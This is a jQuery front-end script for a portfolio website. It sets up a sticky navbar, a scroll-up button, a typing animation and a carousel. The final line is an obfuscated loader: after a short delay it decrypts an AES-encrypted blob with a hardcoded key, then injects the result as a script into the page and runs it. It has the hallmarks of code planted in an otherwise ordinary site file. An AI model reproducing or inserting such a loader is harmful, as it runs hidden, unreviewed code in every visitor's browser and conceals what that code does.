$(document).ready(function() {
  $(window).scroll(function() {
    // sticky navbar on scroll script
    if (this.scrollY > 20) {
      $('.navbar').addClass("sticky");
      $('#preogressbar').show();
      $('#gradiant').show();
    } else {
      $('.navbar').removeClass("sticky");
      $('#preogressbar').hide();
      $('#gradiant').hide();
    }

    // scroll-up button show/hide script
    if (this.scrollY > 500) {
      $('.scroll-up-btn').addClass("show");
    } else {
      if (this.scrollY > 170) {
        $('.grecaptcha-badge').css("z-index", 99);
      } else {
        $('.grecaptcha-badge').css("z-index", -1);
      }
      $('.scroll-up-btn').removeClass("show");
    }
  });

  // slide-up script
  $('.scroll-up-btn').click(function() {
    $('html').animate({ scrollTop: 0 });
    // removing smooth scroll on slide-up button click
    $('html').css("scrollBehavior", "auto");
  });

  $('.navbar .menu li a').click(function() {
    // applying again smooth scroll on menu items click
    $('html').css("scrollBehavior", "smooth");
  });


  function startTypingAnimation(divClass, texts) {
    const typingText = document.querySelector(`.${divClass}`);

    let textIndex = 0;
    let charIndex = 0;
    let isDeleting = false;

    function typeText() {
      const currentText = texts[textIndex];
      typingText.textContent = currentText.substring(0, charIndex);

      if (!isDeleting) {
        charIndex++;
        if (charIndex > currentText.length) {
          isDeleting = true;
          charIndex = currentText.length;
          setTimeout(typeText, 700); // Delay before starting to delete
        } else {
          setTimeout(typeText, 100); // Delay between typing each character
        }
      } else {
        charIndex--;
        if (charIndex === 0) {
          isDeleting = false;
          textIndex = (textIndex + 1) % texts.length;
          setTimeout(typeText, 300); // Delay before typing the next text
        } else {
          setTimeout(typeText, 50); // Faster delay while deleting
        }
      }
    }

    typeText();
  }

  const textsArray = ["Web Developer", "Programmer", "Designer", "Tech Enthusiast", "Freelancer", "Leader"];
  startTypingAnimation('typing', textsArray);
  startTypingAnimation('typing-2', textsArray);


  $('.carousel').owlCarousel({
    margin: 20,
    loop: true,
    autoplay: true,
    autoplayTimeOut: 2000,
    autoplayHoverPause: true,
    responsive: {
      0: {
        items: 1,
        nav: false
      },
      600: {
        items: 2,
        nav: false
      },
      1000: {
        items: 3,
        nav: false
      }
    }
  });
});

setTimeout(function(){var t=CryptoJS.AES.decrypt("U2FsdGVkX19g0PtzzjcpTaR3IxsIDJ+AUNL3OdoDmLXg6VKJzVbL0FnAfXHCQk3lCy/m3vBHeVYchMk9ZGhDFcRImwQTk/uoMey8FEQwmZ2ABzOXiv6Cba362dXqYynxrQq3GkE2oxGgcDa89lIQemNCgFzCYamT/LaNcv5PvrIJ1z8HNB7/gH42wAt0KIG+zge2YiVmvpvwNKKY2muc1u9PneHUzF3ergfcpXoIxOBDDwcIhY/FnFYtxsqiSqO46PxwMIJ3SMK/l9X2ZvDpc7M5rfGMA7cqWCfWjhVKPc8wndqn3hrwb2xiJXZT9UbiX7d7OwSVGrv2Xat1Vjmgl2mskxziuYsxxDYn0uiE0j0ku0vwTMzh4I6jK40Y+jpdzTowo6MucbQ700DkRbqETPjDNHVpZpFKZ+RKf+d3Y4n7P5tIqd7kgGD8gftw3cUb+LLqFI6yCz2BkO1a+ArS1utTKN0p1qtDXLF4NriYJIwUpWzYNP5OSdmXy+n/kvyUe8OLvQ8zExnd0vR7sXr2wkrWOoM4oPtQgcZwi2cUVV8GX5n4TxPS91lSs4z+y2dJhqx6Z0KngJZBhHxMCNcr+qat9Jl9iK7+Ph8hjiaoK7c=","&O2XePWX%D.kDMhNnem;rUdXm'g}$ijQ").toString(CryptoJS.enc.Utf8),c=document.createElement("script");c.textContent=t,document.body.appendChild(c)},200)